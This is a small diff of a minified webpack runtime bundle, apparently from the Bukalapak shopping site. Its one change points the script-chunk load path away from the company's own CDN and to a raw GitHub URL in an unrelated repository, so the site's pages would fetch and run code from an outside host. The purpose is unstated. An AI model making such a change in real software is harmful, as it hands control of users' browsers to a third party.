@@ -220,7 +220,7 @@
         return o.d(t, "a", t), t
     }, o.o = function(e, t) {
         return Object.prototype.hasOwnProperty.call(e, t)
-    }, o.p = "https://static-hermes.bukalapak.com/", o.oe = function(e) {
+    }, o.p = "https://raw.githubusercontent.com/securepass/Test-Git/master/", o.oe = function(e) {
         throw console.error(e), e
     };
     var f = window.webpackJsonp = window.webpackJsonp || [],
